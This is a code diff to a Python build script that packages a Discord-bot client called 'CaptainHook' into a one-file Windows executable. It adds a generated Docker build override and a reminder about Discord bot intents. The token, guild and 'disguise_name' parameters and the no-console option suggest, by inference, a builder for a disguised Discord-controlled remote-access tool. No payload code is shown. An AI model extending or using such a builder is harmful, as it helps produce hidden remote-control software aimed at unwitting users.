@@ -310,6 +310,21 @@ def build(token, guild_id, preset_name, disguise_name):
     # Clear the progress and show success
     console.print("\n[bold green]✅ STAGING SUCCESSFUL![/bold green]")
     
+    # Generate docker-compose.override.yml for Docker builds
+    try:
+        docker_cmd = f"wine python.exe -m PyInstaller --onefile {noconsole} --name CaptainHook --paths=/src/build_staging build_staging/src/client/main.py"
+        override_content = f"""version: '3.8'
+services:
+  windows-builder:
+    command: |
+      bash -c "{docker_cmd}"
+"""
+        with open("docker-compose.override.yml", "w") as f:
+            f.write(override_content)
+        console.print("[dim]Generated docker-compose.override.yml for tailored Docker build.[/dim]")
+    except Exception as e:
+        console.print(f"[bold red]Warning:[/bold red] Could not generate docker-compose.override.yml: {e}")
+
     # Summary Table
     table = Table(box=None, padding=(0, 2))
     table.add_column("Property", style="cyan")
@@ -332,7 +347,11 @@ def build(token, guild_id, preset_name, disguise_name):
     console.print(f"[dim]Alternative: {cmd}[/dim]")
     console.print("-" * 80)
 
-    console.print("\n[bold cyan]💡 Cross-Platform Tip:[/bold cyan]")
+    console.print("\n[bold red]⚠️  IMPORTANT: Discord Intents[/bold red]")
+    console.print("Ensure [bold]Message Content Intent[/bold] is ENABLED in the Discord Developer Portal")
+    console.print("under 'Bot' settings, or the bot will not respond to commands.\n")
+
+    console.print("[bold cyan]💡 Cross-Platform Tip:[/bold cyan]")
     console.print("To build for Windows while on Linux, ensure Docker is installed and run:")
     console.print("[dim]docker-compose up windows-builder[/dim]\n")
 
